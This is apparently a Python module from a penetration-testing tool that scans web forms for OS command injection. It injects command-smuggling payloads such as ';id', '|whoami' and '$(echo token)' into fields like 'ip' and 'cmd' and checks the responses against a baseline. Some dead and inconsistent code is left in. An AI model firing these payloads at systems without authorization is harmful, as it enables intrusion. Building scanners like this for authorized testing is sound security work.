# AutoPen Command Injection Scanner
# Detects OS command injection vulnerabilities
# Uses safe detection payloads only
# Baseline-aware: compares response diff not full page
# For authorized security testing only

import requests
import time
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from modules.recon.crawler import WebCrawler

TOKEN = f"pwned{int(time.time())}"

console = Console()

# ─────────────────────────────────────────────
# PAYLOAD LIBRARY
# ─────────────────────────────────────────────
# Each tuple: (payload_suffix, signature_to_find)
# Signatures that are UNIQUE to command output — not in normal pages.

CMD_PAYLOADS = [
    # echo unique token — never appears in normal ping output
    (f";echo {TOKEN}", TOKEN),
    (f"|echo {TOKEN}", TOKEN),
    (f"&&echo {TOKEN}", TOKEN),
    (f"`echo {TOKEN}`", TOKEN),
    (f"$(echo {TOKEN})", TOKEN),

    # id command — uid=N(name) format is unique to command output
    (";id", "uid="),
    ("|id", "uid="),
    ("&&id", "uid="),

    # whoami — just the username on its own line
    (";whoami", "www-data"),
    ("|whoami", "www-data"),
    ("&&whoami", "www-data"),

    # ping — kept last, baseline may already contain 127.0.0.1
    (";ping -c 1 127.0.0.1", "bytes from 127.0.0.1"),
    ("|ping -c 1 127.0.0.1", "bytes from 127.0.0.1"),
]

# Signatures that genuinely confirm command execution
# IMPORTANT: "www-data", "apache", "root" can appear in page HTML
# so they are only trusted when NOT present in the baseline
CMD_SIGNATURES = [
    "TOKEN",       # echo unique token — never a false positive
    "uid=",                  # id output — uid=33(www-data) format
    "www-data",              # whoami — checked against baseline
    "root",                  # whoami as root — checked against baseline
    "bytes from 127.0.0.1", # ping — checked against baseline
]


def is_internal_target(url: str, target_ip: str) -> bool:
    from urllib.parse import urlparse
    try:
        parsed = urlparse(url)
        host = parsed.hostname or ''
        return host == target_ip
    except Exception:
        return False


class CmdInjectionScanner:
    def __init__(self, config: dict, logger, validator):
        self.target_ip = config['target']['host']
        self.base_url = f"http://{self.target_ip}"
        self.target_url = config['target']['url']
        self.username = config['target'].get('username')
        self.password = config['target'].get('password')
        self.timeout = config['scan']['timeout']
        self.logger = logger
        self.validator = validator
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config['scan']['user_agent']
        })
        self.config = config

    def run(self, crawl_results=None) -> list:
        """Main command injection scan function"""
        console.print(Panel(
            "[bold green]PHASE 7: COMMAND INJECTION DETECTION[/bold green]\n"
            f"Target: [bold white]{self.target_ip}[/bold white]\n"
            "Testing for OS command injection...",
            style="green"
        ))

        if not self.validator.is_host_in_scope(self.target_ip):
            console.print("[bold red]Target out of scope.[/bold red]")
            return []

        # Authentication is handled by the shared session in main.py if provided

        if crawl_results is None:
            crawler = WebCrawler(self.config, self.logger, self.session)
            crawl_results = crawler.run()
        else:
            console.print("\n[cyan]Using shared crawler results.[/cyan]")

        forms = crawl_results['forms']

        # Direct testing removed

        # Test any crawler-discovered forms with cmd-like field names
        console.print(
            f"\n[cyan]Testing {len(forms)} forms for command injection...[/cyan]"
        )
        for form in forms:
            action = form.get('action', '')
            if not is_internal_target(action, self.target_ip):
                continue
            # Skip exec/ — already tested directly above
            if 'exec' in action.lower():
                continue
            for inp in form.get('inputs', []):
                name = inp.get('name', '').lower()
                if name in ['ip', 'host', 'cmd', 'command',
                            'exec', 'ping', 'target']:
                    self._test_form_field(form, inp['name'])

        self._display_results()
        return self.findings


        if not found:
            console.print("  [green]✓ No command injection detected[/green]")

    def _test_form_field(self, form: dict, field: str):
        """
        Test a form field for command injection.
        Uses same baseline-aware approach.
        """
        action = form.get('action', '')
        inputs = form.get('inputs', [])

        console.print(
            f"\n[cyan]Testing form:[/cyan] {action[-50:]}\n"
            f"[cyan]Field:[/cyan] {field}"
        )

        base_data = {
            i['name']: i.get('value', 'test')
            for i in inputs if i.get('name')
        }

        # Get baseline for this form
        try:
            baseline_resp = self.session.post(
                action, data=base_data, timeout=self.timeout
            )
            baseline_lower = baseline_resp.text.lower()
        except Exception:
            return

        found = False
        for payload, signature in CMD_PAYLOADS[:8]:  # echo + id payloads only
            if found:
                break
            try:
                test_data = base_data.copy()
                test_data[field] = f"127.0.0.1{payload}"

                response = self.session.post(
                    action, data=test_data, timeout=self.timeout
                )
                self.logger.log_request('POST', action, response.status_code)

                sig_lower = signature.lower()
                if (sig_lower in response.text.lower() and
                        sig_lower not in baseline_lower):
                    finding = {
                        'title': f"Command Injection in parameter '{field}'",
                        'type': 'cmd_injection',
                        'vuln_type': 'Command Injection',
                        'target': action,
                        'parameter': field,
                        'payload': payload,
                        'severity': 'CRITICAL',
                        'cvss_score': 9.8,
                        'cvss_vector': (
                            'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H'
                        ),
                        'description': (
                            f"Command injection in '{field}'. "
                            "User input passed directly to OS command."
                        ),
                        'evidence': (
                            f"Payload: {payload}\n"
                            f"Signature: {signature}\n"
                            f"Not present in baseline — confirmed injection."
                        ),
                        'remediation': (
                            "1. Never pass user input to system commands.\n"
                            "2. Use built-in functions instead.\n"
                            "3. Whitelist allowed input values."
                        ),
                        'references': [
                            'https://owasp.org/www-community/attacks/Command_Injection',
                            'CWE-78: OS Command Injection'
                        ],
                        'discovered_at': datetime.now().isoformat()
                    }
                    self.findings.append(finding)
                    self.logger.log_finding('Command Injection', action, 'CRITICAL')
                    console.print(f"  [bold red]✗ VULNERABLE![/bold red]")
                    found = True

                time.sleep(0.1)

            except Exception as e:
                self.logger.log_error('cmd_form', str(e))

        if not found:
            console.print("  [green]✓ No injection detected[/green]")

    def _display_results(self):
        console.print(f"\n[bold white]Command Injection Scan Complete.[/bold white]")

        if not self.findings:
            console.print("[bold green]✓ No command injection found.[/bold green]")
            return
        # Display findings
        table = Table(
            title="Command Injection Findings",
            box=box.ROUNDED,
            style="green"
        )
        table.add_column("Type", style="bold white", width=25)
        table.add_column("Parameter", style="cyan", width=15)
        table.add_column("Severity", style="bold red", width=10)
        table.add_column("CVSS", style="bold", width=6)

        for f in self.findings:
            table.add_row(
                f['vuln_type'],
                f['parameter'],
                f['severity'],
                str(f['cvss_score'])
            )

        console.print(table)
        console.print(
            f"[bold green]Total Command Injection Findings: "
            f"{len(self.findings)}[/bold green]"
        )
